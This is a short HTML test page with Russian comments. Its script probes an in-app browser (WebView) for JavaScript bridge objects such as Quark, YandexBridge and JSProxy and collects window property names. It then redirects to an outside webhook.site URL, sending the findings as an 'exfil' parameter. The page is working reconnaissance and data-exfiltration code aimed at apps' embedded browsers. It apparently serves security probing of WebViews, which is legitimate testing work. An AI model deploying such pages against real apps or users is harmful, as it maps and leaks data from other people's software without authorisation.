<!DOCTYPE html>
<html>
<head><title>Testing...</title></head>
<body>
    <h1 id="status">Ждем исполнения скрипта...</h1>

    <script>
        // Функция для отправки данных через редирект (самый пробивной метод)
        function sendData(param, value) {
            window.location.href = "https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?" + param + "=" + encodeURIComponent(value);
        }

        try {
            document.getElementById('status').innerText = "JS запущен, анализируем...";
            
            // 1. Проверяем наличие самого подозрительного объекта
            var bridgeName = "None";
            if (window.Quark) bridgeName = "Quark";
            else if (window.YandexBridge) bridgeName = "YandexBridge";
            else if (window.JSProxy) bridgeName = "JSProxy";

            // 2. Вместо перебора всех ключей, берем только первые 10 для теста стабильности
            var keys = Object.getOwnPropertyNames(window).slice(0, 15).join(',');

            // 3. Пытаемся "вылететь" из WebView на вебхук с данными
            sendData("exfil", "Bridge:" + bridgeName + "|Keys:" + keys);

        } catch (e) {
            // Если скрипт упал - отправляем ошибку
            sendData("error", e.message);
        }
    </script>
</body>
</html>
